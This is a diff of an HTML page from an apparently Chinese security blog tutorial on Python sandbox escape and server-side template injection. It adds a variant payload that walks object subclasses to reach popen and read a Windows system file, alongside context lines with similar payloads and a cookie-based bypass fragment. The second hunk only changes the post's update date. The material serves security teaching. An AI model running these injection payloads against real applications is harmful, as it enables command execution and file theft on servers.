@@ -361,7 +361,10 @@ a.age   #getattr  调用不存在的属性会执行，相当于处理了Attribut
 
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150434.png" alt="image-20200421162023248"></p>
 <p>从中查找是否有关于文件读取的方法，比如open，file函数。在最后找到一个popen函数。</p>
-<pre class="line-numbers language-none"><code class="language-none">&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&quot;C:\\windows\\win.ini&quot;).read()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&quot;C:\\windows\\win.ini&quot;).read()
+
+#如果这里会报错添加__builtins__
+&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.__builtins__[&#39;popen&#39;](&quot;C:\\windows\\win.ini&quot;).read()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>如果想直接在终端显示出来</p>
 <pre class="line-numbers language-none"><code class="language-none">&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&quot;type C:\\windows\\win.ini&quot;).read()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -1213,7 +1216,7 @@ Cookie: aa&#x3D;__class__;bb&#x3D;__mro__;cc&#x3D;__subclasses__<span aria-hidde
                     <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
                     <p>原文链接：<a href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/">https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/</a>
                     <p>发表日期：<a href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/">April 21st 2020, 9:11:03 am</a>
-                    <p>更新日期：<a href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/">April 24th 2020, 3:38:48 pm</a>
+                    <p>更新日期：<a href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/">September 22nd 2022, 3:24:56 pm</a>
                     <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                 </div>
               
